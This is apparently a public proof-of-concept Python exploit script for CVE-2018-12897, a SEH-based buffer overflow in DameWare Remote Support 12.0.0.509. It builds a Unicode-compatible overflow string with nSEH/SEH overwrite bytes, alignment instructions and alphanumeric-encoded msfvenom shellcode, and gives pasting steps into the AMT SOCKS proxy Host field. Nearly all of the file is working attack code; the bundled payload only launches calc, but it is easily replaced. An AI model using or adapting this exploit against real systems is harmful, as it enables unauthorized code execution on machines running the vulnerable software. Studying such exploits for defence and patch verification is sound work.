#!/usr/bin/env python
# Author: Xavi Beltran
# Date: 11/07/2019
# Description:
#           SEH based Buffer Overflow
#			DameWare Remote Support V. 12.0.0.509
#			CVE-2018-12897

# Contact: xavibeltran@protonmail.com
# Webpage: https://xavibel.com
# Tested on: Windows XP SP3 ESP

# Credit for Adam Jeffreys from Nettitude! :)

# Usage:
#			Right click on a host >> AMT >> AMT Settings dialog
#			Mark "Use SOCKS proxy" box
#			Paste the string in the Host field

junk  = "\x41" * 1672

# Unicode compatible padding
nseh = "\x61\x43"

# 007A007B - POP POP RET
seh = "\x7B\x7A"

align  = ""
align += "\x05\x20\x11"       # add eax,0x11002000
align += "\x71"               # Venetian Padding
align += "\x2d\x19\x11"       # sub eax,0x11001900
align += "\x71"               # Venetian Padding
align += "\x50"               # push eax
align += "\x71"               # Venetian Padding
align += "\xC3"               # RETN

padding = "\x41" * 11

junk2 = "\x41" * 870
junk3 = "\x41" * 2014

# msfvenom -p windows/exec CMD=calc -f raw > shellcode.raw
# ./alpha2 eax --unicode --uppercase < shellcode.raw
# 508 bytes
shellcode = "PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLYX4BM0M0KPQP4IZEP17PQTDKPPNPTK1BLLDK1BLTTKT2MXLOVWPJMV01KO6LOLS13LM2NLMPWQHOLMM1WWK2KBPR27TKPRLP4K0JOLTK0LN1D8K3OXKQJ1R1TKPYMPM1HS4KPILXYSOJQ9DKOD4KM1XVNQKO6LGQ8OLMM1WWP89PRUZVLCSMKHOKSMMT2UJD1HDKQHNDKQJ31VTKLL0K4K1HMLM1J3DKKTTKM1HP3YQ4O4ND1K1KQQR9PZ0QKOYPQOQOQJDKLRZKTM1MRJM1DMCUH2KPKPKPPPQXP1TKBOU7KOHUWKL07EFB0V38W6V5WMUMKOJ5OLM63LLJ3PKKIP2UKUWK17MCBRROQZM0B3KOZ51S1Q2LQSKPA"


crash = junk + nseh + seh + padding + align + junk2 + shellcode + junk3

print(crash)